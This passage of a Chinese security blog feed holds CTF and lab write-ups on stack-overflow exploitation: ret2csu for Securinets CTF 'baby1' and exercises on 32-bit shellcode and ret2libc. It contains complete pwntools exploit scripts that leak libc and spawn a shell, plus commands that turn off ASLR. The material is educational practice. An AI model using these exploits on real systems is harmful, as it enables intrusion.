class="keyword">uint32_t</span>   p_align;</span><br><span class="line">&#125; Elf32_Phdr;</span><br></pre></td></tr></table></figure><p>下面说下5种常见的程序头类型。</p><h3 id="2-1-PT-LOAD"><a href="#2-1-PT-LOAD" class="headerlink" title="2.1 PT_LOAD"></a>2.1 PT_LOAD</h3><p>一个可执行文件至少有一个PT_LOAD类型的段，该段描述的是可装载的段，即该类段将被装载或者映射到内存中。</p>]]></content>
    
    <summary type="html">
    
      未完待续...
    
    </summary>
    
      <category term="二进制基础" scheme="https://Mi1k7ea.github.com/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="二进制" scheme="https://Mi1k7ea.github.com/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    
  </entry>
  
  <entry>
    <title>栈溢出之ret2csu</title>
    <link href="https://Mi1k7ea.github.com/2019/04/12/%E4%B8%AD%E7%BA%A7ROP%E4%B9%8Bret2csu/"/>
    <id>https://Mi1k7ea.github.com/2019/04/12/中级ROP之ret2csu/</id>
    <published>2019-04-12T13:30:11.000Z</published>
    <updated>2019-05-28T14:18:06.765Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-ret2csu"><a href="#0x01-ret2csu" class="headerlink" title="0x01 ret2csu"></a>0x01 ret2csu</h2><p><strong>CTF Wiki</strong></p><blockquote><p>在 64 位程序中，函数的前 6 个参数是通过寄存器传递的，但是大多数时候，我们很难找到每一个寄存器对应的 gadgets。 这时候，我们可以利用 x64 下的 __libc_csu_init 中的 gadgets。这个函数是用来对 libc 进行初始化操作的，而一般的程序都会调用 libc 函数，所以这个函数一定会存在。我们先来看一下这个函数 (当然，不同版本的这个函数有一定的区别)</p></blockquote><p>这里我们以本地编译的蒸米示例的level5为例，用objdump -d level5命令即可查看到以下内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">00000000004005c0 &lt;__libc_csu_init&gt;:</span><br><span class="line">  4005c0:41 57                push   %r15</span><br><span class="line">  4005c2:41 56                push   %r14</span><br><span class="line">  4005c4:41 89 ff             mov    %edi,%r15d</span><br><span class="line">  4005c7:41 55                push   %r13</span><br><span class="line">  4005c9:41 54                push   %r12</span><br><span class="line">  4005cb:4c 8d 25 3e 08 20 00 lea    0x20083e(%rip),%r12        # 600e10 &lt;__frame_dummy_init_array_entry&gt;</span><br><span class="line">  4005d2:55                   push   %rbp</span><br><span class="line">  4005d3:48 8d 2d 3e 08 20 00 lea    0x20083e(%rip),%rbp        # 600e18 &lt;__init_array_end&gt;</span><br><span class="line">  4005da:53                   push   %rbx</span><br><span class="line">  4005db:49 89 f6             mov    %rsi,%r14</span><br><span class="line">  4005de:49 89 d5             mov    %rdx,%r13</span><br><span class="line">  4005e1:4c 29 e5             sub    %r12,%rbp</span><br><span class="line">  4005e4:48 83 ec 08          sub    $0x8,%rsp</span><br><span class="line">  4005e8:48 c1 fd 03          sar    $0x3,%rbp</span><br><span class="line">  4005ec:e8 0f fe ff ff       callq  400400 &lt;_init&gt;</span><br><span class="line">  4005f1:48 85 ed             test   %rbp,%rbp</span><br><span class="line">  4005f4:74 20                je     400616 &lt;__libc_csu_init+0x56&gt;</span><br><span class="line">  4005f6:31 db                xor    %ebx,%ebx</span><br><span class="line">  4005f8:0f 1f 84 00 00 00 00 nopl   0x0(%rax,%rax,1)</span><br><span class="line">  4005ff:00 </span><br><span class="line">  400600:4c 89 ea             mov    %r13,%rdx</span><br><span class="line">  400603:4c 89 f6             mov    %r14,%rsi</span><br><span class="line">  400606:44 89 ff             mov    %r15d,%edi</span><br><span class="line">  400609:41 ff 14 dc          callq  *(%r12,%rbx,8)</span><br><span class="line">  40060d:48 83 c3 01          add    $0x1,%rbx</span><br><span class="line">  400611:48 39 eb             cmp    %rbp,%rbx</span><br><span class="line">  400614:75 ea                jne    400600 &lt;__libc_csu_init+0x40&gt;</span><br><span class="line">  400616:48 83 c4 08          add    $0x8,%rsp</span><br><span class="line">  40061a:5b                   pop    %rbx</span><br><span class="line">  40061b:5d                   pop    %rbp</span><br><span class="line">  40061c:41 5c                pop    %r12</span><br><span class="line">  40061e:41 5d                pop    %r13</span><br><span class="line">  400620:41 5e                pop    %r14</span><br><span class="line">  400622:41 5f                pop    %r15</span><br><span class="line">  400624:c3                   retq   </span><br><span class="line">  400625:90                   nop</span><br><span class="line">  400626:66 2e 0f 1f 84 00 00 nopw   %cs:0x0(%rax,%rax,1)</span><br><span class="line">  40062d:00 00 00</span><br></pre></td></tr></table></figure><p>这里我们可以利用以下几点：</p><ul><li>从 0x000000000040061A 一直到结尾，我们可以利用栈溢出构造栈上数据来控制rbx、rbp、r12、r13、r14、r15 寄存器的数据；</li><li>从 0x0000000000400600 到 0x0000000000400609，我们可以将r13赋给rdx，将r14赋给rsi，将r15d赋给 edi（需要注意的是，虽然这里赋给的是 edi，<strong>但其实此时 rdi 的高 32 位寄存器值为 0（自行调试）</strong>，所以其实我们可以控制rdi寄存器的值，只不过只能控制低32位），而这三个寄存器，也是 x64 函数调用中传递的前三个寄存器。此外，如果我们可以合理地控制r12与rbx，那么我们就可以调用我们想要调用的函数。比如说我们可以控制rbx为0，r12为存储我们想要调用的函数的地址。</li><li>从0x000000000040060D到0x0000000000400614，我们可以控制rbx与rbp的之间的关系为rbx + 1 = rbp，这样我们就不会执行loc_400600，进而可以继续执行下面的汇编程序。这里我们可以简单的设置rbx=0，rbp=1。</li></ul><p><strong>BlackHat 2018</strong></p><p>该项技术在BlackHat 2018中介绍过，下面用其PPT来说下。</p><p>先编写一个代码量很小的C代码，编译该C文件之后会看到存在大量代码，除去源代码部分，剩下的代码都成为Attached Code即附属代码：</p><p><img src="/2019/04/12/中级ROP之ret2csu/6.png" alt=""></p><p><img src="/2019/04/12/中级ROP之ret2csu/7.png" alt=""></p><p>这些Attached Code的攻击是多有效呢？</p><p><img src="/2019/04/12/中级ROP之ret2csu/8.png" alt=""></p><p>下面看下这两段可以利用的Gadgets，具体的描述前面已讲解，这里的图片更具体地表现出来了：</p><p><img src="/2019/04/12/中级ROP之ret2csu/9.png" alt=""></p><p><img src="/2019/04/12/中级ROP之ret2csu/10.png" alt=""></p><p>将两段Gadgets连接起来构造出ROP链，从而可以实现调用任意含有3个参数的函数：</p><p><img src="/2019/04/12/中级ROP之ret2csu/11.png" alt=""></p><p><img src="/2019/04/12/中级ROP之ret2csu/12.png" alt=""></p><p>利用write()函数泄露libc地址：</p><p><img src="/2019/04/12/中级ROP之ret2csu/14.png" alt=""></p><p><img src="/2019/04/12/中级ROP之ret2csu/15.png" alt=""></p><p>最终构造的ROP链：</p><p><img src="/2019/04/12/中级ROP之ret2csu/16.png" alt=""></p><p>什么时候适合应用ret2csu呢？</p><p><img src="/2019/04/12/中级ROP之ret2csu/13.png" alt=""></p><h2 id="0x02-Securinets-CTF-baby1"><a href="#0x02-Securinets-CTF-baby1" class="headerlink" title="0x02 Securinets CTF baby1"></a>0x02 Securinets CTF baby1</h2><p>这里以Securinets CTF的一道Pwn题baby1为例。</p><p>程序先输出一段内容，然后让你输入东西后即退出；是个动态链接文件，会加载libc；安全编译选项只开启了NX：</p><p><img src="/2019/04/12/中级ROP之ret2csu/1.png" alt=""></p><p>IDA分析下，存在明显的栈溢出漏洞，但在程序中找不到system()函数和”/bin/sh”字符串，但是可看到其是存在read()、write()和__libc_csu_init()函数的，由此可以联想到可以利用ret2csu技术来实现攻击：</p><p><img src="/2019/04/12/中级ROP之ret2csu/2.png" alt=""></p><p>通过objdump -d baby1命令查看__libc_csu_init()函数的gadgets：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">0000000000400660 &lt;__libc_csu_init&gt;:</span><br><span class="line">  400660:41 57                push   %r15</span><br><span class="line">  400662:41 56                push   %r14</span><br><span class="line">  400664:41 89 ff             mov    %edi,%r15d</span><br><span class="line">  400667:41 55                push   %r13</span><br><span class="line">  400669:41 54                push   %r12</span><br><span class="line">  40066b:4c 8d 25 9e 07 20 00 lea    0x20079e(%rip),%r12        # 600e10 &lt;__frame_dummy_init_array_entry&gt;</span><br><span class="line">  400672:55                   push   %rbp</span><br><span class="line">  400673:48 8d 2d 9e 07 20 00 lea    0x20079e(%rip),%rbp        # 600e18 &lt;__init_array_end&gt;</span><br><span class="line">  40067a:53                   push   %rbx</span><br><span class="line">  40067b:49 89 f6             mov    %rsi,%r14</span><br><span class="line">  40067e:49 89 d5             mov    %rdx,%r13</span><br><span class="line">  400681:4c 29 e5             sub    %r12,%rbp</span><br><span class="line">  400684:48 83 ec 08          sub    $0x8,%rsp</span><br><span class="line">  400688:48 c1 fd 03          sar    $0x3,%rbp</span><br><span class="line">  40068c:e8 e7 fd ff ff       callq  400478 &lt;_init&gt;</span><br><span class="line">  400691:48 85 ed             test   %rbp,%rbp</span><br><span class="line">  400694:74 20                je     4006b6 &lt;__libc_csu_init+0x56&gt;</span><br><span class="line">  400696:31 db                xor    %ebx,%ebx</span><br><span class="line">  400698:0f 1f 84 00 00 00 00 nopl   0x0(%rax,%rax,1)</span><br><span class="line">  40069f:00 </span><br><span class="line">  4006a0:4c 89 ea             mov    %r13,%rdx</span><br><span class="line">  4006a3:4c 89 f6             mov    %r14,%rsi</span><br><span class="line">  4006a6:44 89 ff             mov    %r15d,%edi</span><br><span class="line">  4006a9:41 ff 14 dc          callq  *(%r12,%rbx,8)</span><br><span class="line">  4006ad:48 83 c3 01          add    $0x1,%rbx</span><br><span class="line">  4006b1:48 39 eb             cmp    %rbp,%rbx</span><br><span class="line">  4006b4:75 ea                jne    4006a0 &lt;__libc_csu_init+0x40&gt;</span><br><span class="line">  4006b6:48 83 c4 08          add    $0x8,%rsp</span><br><span class="line">  4006ba:5b                   pop    %rbx</span><br><span class="line">  4006bb:5d                   pop    %rbp</span><br><span class="line">  4006bc:41 5c                pop    %r12</span><br><span class="line">  4006be:41 5d                pop    %r13</span><br><span class="line">  4006c0:41 5e                pop    %r14</span><br><span class="line">  4006c2:41 5f                pop    %r15</span><br><span class="line">  4006c4:c3                   retq   </span><br><span class="line">  4006c5:90                   nop</span><br><span class="line">  4006c6:66 2e 0f 1f 84 00 00 nopw   %cs:0x0(%rax,%rax,1)</span><br><span class="line">  4006cd:00 00 00</span><br></pre></td></tr></table></figure><p>可以确定gadget1的地址为0x4006ba，gadget2的地址为0x4006a0。</p><p>GDB调试，使用pattern计算溢出字节为56：</p><p><img src="/2019/04/12/中级ROP之ret2csu/3.png" alt=""></p><p>这里我参考另一篇博文《蒸米32位及64位ROP笔记》中level5的第二种做法，我们再找一个pop rdi;ret的gadget：</p><p><img src="/2019/04/12/中级ROP之ret2csu/4.png" alt=""></p><p>找到该gadget地址为0x4006c3。</p><p>仿照level5写payload就好（具体的解释可以看《蒸米32位及64位ROP笔记》）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"192.168.17.157"</span>, <span class="number">10001</span>)</span><br><span class="line">p.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./baby1"</span>)</span><br><span class="line"></span><br><span class="line">gadget1 = <span class="number">0x4006ba</span></span><br><span class="line">gadget2 = <span class="number">0x4006a0</span></span><br><span class="line">pop_rdi_ret_addr = <span class="number">0x00000000004006c3</span></span><br><span class="line"></span><br><span class="line">main_addr = elf.symbols[<span class="string">"main"</span>]</span><br><span class="line">write_got = elf.got[<span class="string">"write"</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]main() addr: "</span> + hex(main_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]write() got: "</span> + hex(write_got)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span><span class="params">(rbx, rbp, r12, r13, r14, r15, ret)</span>:</span></span><br><span class="line">        payload = <span class="string">"A"</span> * <span class="number">56</span></span><br><span class="line">        payload += p64(gadget1) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)</span><br><span class="line">        payload += p64(gadget2)</span><br><span class="line">        payload += <span class="string">"B"</span> * <span class="number">56</span></span><br><span class="line">        payload += p64(ret)</span><br><span class="line">        <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]sending payload to leak write() addr..."</span></span><br><span class="line">payload = csu(<span class="number">0</span>, <span class="number">1</span>, write_got, <span class="number">8</span>, write_got, <span class="number">1</span>, main_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">write_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]leak write() addr: "</span> + hex(write_got)</span><br><span class="line"></span><br><span class="line">p.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">"write"</span>, write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">"write"</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">"system"</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">"str_bin_sh"</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]libc base: "</span> + hex(libc_base)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]system() addr: "</span> + hex(system_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]/bin/sh addr: "</span> + hex(binsh_addr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]sending exp..."</span></span><br><span class="line">exp = <span class="string">"A"</span> * <span class="number">56</span></span><br><span class="line">exp += p64(pop_rdi_ret_addr)</span><br><span class="line">exp += p64(binsh_addr)</span><br><span class="line">exp += p64(system_addr)</span><br><span class="line">p.sendline(exp)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>这里打远程的机子：</p><p><img src="/2019/04/12/中级ROP之ret2csu/5.png" alt=""></p><h2 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h2><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/medium-rop/#ret2csu" target="_blank" rel="noopener">ret2csu</a></p><p><a href="http://eternalsakura13.com/2018/03/31/return2csu/" target="_blank" rel="noopener">return2csu学习笔记</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Pwn" scheme="https://Mi1k7ea.github.com/categories/Pwn/"/>
    
    
      <category term="二进制" scheme="https://Mi1k7ea.github.com/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    
      <category term="栈溢出" scheme="https://Mi1k7ea.github.com/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    
      <category term="Pwn" scheme="https://Mi1k7ea.github.com/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>蒸米32位及64位ROP笔记</title>
    <link href="https://Mi1k7ea.github.com/2019/04/09/%E8%92%B8%E7%B1%B3ROP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://Mi1k7ea.github.com/2019/04/09/蒸米ROP学习笔记/</id>
    <published>2019-04-09T13:39:23.000Z</published>
    <updated>2019-05-28T14:18:16.075Z</updated>
    
    <content type="html"><![CDATA[<p>这里将《一步一步学 ROP 之 Linux_x86 篇》和《一步一步学 ROP 之 Linux_64 篇》中的例子做一遍并记录下来。</p><h2 id="0x01-32位ROP"><a href="#0x01-32位ROP" class="headerlink" title="0x01 32位ROP"></a>0x01 32位ROP</h2><h3 id="level1——栈上执行shellcode"><a href="#level1——栈上执行shellcode" class="headerlink" title="level1——栈上执行shellcode"></a>level1——栈上执行shellcode</h3><p>level1主要演示32位程序中最基本的栈溢出利用，可直接在栈上写shellcode并执行。</p><p>level1.c：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable_function</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">read(STDIN_FILENO, buf, <span class="number">256</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">vulnerable_function();</span><br><span class="line">write(STDOUT_FILENO, <span class="string">"Hello, World\n"</span>, <span class="number">13</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用如下指令编译：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -fno-stack-protector -z execstack -o level1 level1.c</span><br></pre></td></tr></table></figure><p>-m32参数指定编译为32位程序；-fno-stack-protector参数指定不开启堆栈溢出保护，即不生成 canary；-z execstack参数指定允许栈执行，即不开启NX。</p><p>下面3条指令用来关闭整个linux系统的ASLR保护：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo -s</span><br><span class="line"><span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure><p>运行程序，输入一串字符串然后返回helloworld；file查看是个动态链接的32位文件；checksec查看所有安全编译选项都没有开：</p><p><img src="/2019/04/09/蒸米ROP学习笔记/1.png" alt=""></p><p>利用pattern计算偏移，可得到溢出偏移量为140：</p><p><img src="/2019/04/09/蒸米ROP学习笔记/2.png" alt=""></p><p>由此，我们可以构造”A”*140+shellcode_addr即可将shellcode地址覆盖到函数返回地址中，从而让EIP指针寄存器指向shellcode地址让程序执行shellcode。</p><p>这里NX没开，我们可以直接往栈上写shellcode，具体为shellcode+”A”*(140-len(shellcode))+shellcode_addr。</p><p>shellcode的构造直接用pwntools的asm(shellcraft.sh())来获得。</p><p>下面获取写入的shellcode地址。由于ASLR等都关掉，因此现在获取的地址就不会变了。</p><p><strong>一个GDB的坑</strong></p><p>在GDB中调试level1，r运行，再输入”abcdaaaaa……”让程序崩溃，然后输入x/10s \$esp-144（144是由前面得到的140偏移再加上4字节的ret得到的）：</p><p><img src="/2019/04/09/蒸米ROP学习笔记/3.png" alt=""></p><p>得到shellcode输入位置的偏移为0xffffcf70。</p><p>写payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./level1"</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">shellcode_addr = <span class="number">0xffffcf70</span></span><br><span class="line">payload = shellcode.ljust(<span class="number">140</span>, <span class="string">"A"</span>) + p32(shellcode_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>然而在运行时会报错，无法正常利用。</p><p><strong>填坑</strong></p><blockquote><p>对初学者来说这个shellcode地址的位置其实是一个坑。因为正常的思维是使用gdb调试目标程序，然后查看内存来确定shellcode的位置。但当你真的执行exp的时候你会发现shellcode压根就不在这个地址上！这是为什么呢？原因是gdb的调试环境会影响buf在内存中的位置，虽然我们关闭了ASLR，但这只能保证buf的地址在gdb的调试环境中不变，但当我们直接执行./level1的时候，buf的位置会固定在别的地址上。怎么解决这个问题呢？</p></blockquote><p>最简单的方法就是开启core dump这个功能。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ulimit -c unlimited</span><br><span class="line">sudo sh -c &apos;echo &quot;/tmp/core.%t&quot; &gt; /proc/sys/kernel/core_pattern&apos;</span><br></pre></td></tr></table></figure><p>开启之后，当出现内存错误的时候，系统会生成一个core dump文件在tmp目录下。然后我们再用gdb查看这个core文件就可以获取到buf真正的地址了。</p><p><img src="/2019/04/09/蒸米ROP学习笔记/4.png" alt=""></p><p>由此得到shellcode真正的地址0xffffcfb0。</p><p>改下payload的地址即可getshell：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./level1"</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">shellcode_addr = <span class="number">0xffffcfb0</span></span><br><span class="line">payload = shellcode.ljust(<span class="number">140</span>, <span class="string">"A"</span>) + p32(shellcode_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2019/04/09/蒸米ROP学习笔记/5.png" alt=""></p><p>除了本地调试，还有远程部署的方式，如下，将题目绑定到指定端口上：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat tcp<span class="_">-l</span>:10001,fork <span class="built_in">exec</span>:./level1</span><br></pre></td></tr></table></figure><p>payload除了将p = process(“./level1”)改为p = remote(“127.0.0.1”, 10001)外，ret的地址还会发生改变。解决方法还是采用生成core dump的方案，然后用gdb调试core文件获取返回地址：</p><p><img src="/2019/04/09/蒸米ROP学习笔记/6.png" alt=""></p><p>得到ret地址为0xffffcf00，改下payload即可远程getshell：</p><p><img src="/2019/04/09/蒸米ROP学习笔记/7.png" alt=""></p><h3 id="level2——ret2libc绕过NX"><a href="#level2——ret2libc绕过NX" class="headerlink" title="level2——ret2libc绕过NX"></a>level2——ret2libc绕过NX</h3><p>一样的代码，只不过在用GCC编译开启NX保护即栈不可执行。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -fno-stack-protector -o level2 level1.c</span><br></pre></td></tr></table></figure><p><img src="/2019/04/09/蒸米ROP学习笔记/8.png" alt=""></p><blockquote><p>这时候我们如果使用level1的exp来进行测试的话，系统会拒绝执行我们的shellcode。如果你通过<code>sudo cat /proc/[pid]/maps</code>查看，你会发现level1的stack是rwx的，但是level2的stack却是rw的。</p></blockquote><p><img src="/2019/04/09/蒸米ROP学习笔记/9.png" alt=""></p><p>既然开启了NX，那一般是利用ROP绕过，这里用的是ret2libc，因为程序level2调用了libc.so，并且libc.so里保存了大量可利用的函数如system()和/bin/sh，我们如果可以让程序执行system(“/bin/sh”)的话，也可以获取到shell。</p><p>下面的问题就变为怎么获取libc中的system和binsh的地址。</p><p>因为我们关掉了ASLR，此时system()函数在内存中的地址是不会变化的，并且libc.so中也包含”/bin/sh”这个字符串，并且这个字符串的地址也是固定的。</p><p>此时我们可以使用GDB进行调试，在main打下断点然后运行，程序在main断点处停下再通过print和find命令来查找system和”/bin/sh”字符串的地址：</p><p><img src="/2019/04/09/蒸米ROP学习笔记/10.png" alt=""></p><p>system()函数地址为：0xf7e42940</p><p>/bin/sh地址为：0xf7f6102b</p><p>至于溢出偏移量和level1一样为140。</p><p>编写payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./level2"</span>)</span><br><span class="line"></span><br><span class="line">system_addr = <span class="number">0xf7e42940</span></span><br><span class="line">binsh_addr = <span class="number">0xf7f6102b</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">140</span> + p32(system_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(binsh_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2019/04/09/蒸米ROP学习笔记/11.png" alt=""></p><h3 id="level2——ROP绕过NX和ASLR"><a href="#level2——ROP绕过NX和ASLR" class="headerlink" title="level2——ROP绕过NX和ASLR"></a>level2——ROP绕过NX和ASLR</h3><p>在前一小节的基础下，开启在level1中关掉的ASLR：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo -s</span><br><span class="line"><span class="built_in">echo</span> 2 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure><p>如果你通过sudo cat /proc/[pid]/maps或者ldd查看，你会发现level2的libc.so地址每次都是变化的：</p><p><img src="/2019/04/09/蒸米ROP学习笔记/12.png" alt=""></p><p>此时利用前一小节的办法print和find是获取不到对的地址的，因为每次运行栈的地址都会变化。</p><p>如何利用呢？——思路是：先泄漏出libc.so某些函数在内存中的地址，再利用泄漏出的函数地址根据偏移量计算出system()函数和/bin/sh字符串在内存中的地址，最后执行我们的ret2libc的shellcode。既然栈、libc、堆的地址都是随机的，我们怎么才能泄露出libc.so的地址呢？方法还是有的，因为程序本身在内存中的地址并不是随机的，如图所示，Linux内存随机化分布图：</p><p><img src="/2019/04/09/蒸米ROP学习笔记/13.png" alt=""></p><p>所以我们只要把返回值设置到程序本身就可执行我们期望的指令了。</p><p>首先我们利用objdump来查看可以利用的plt函数和函数对应的got表：</p><p><img 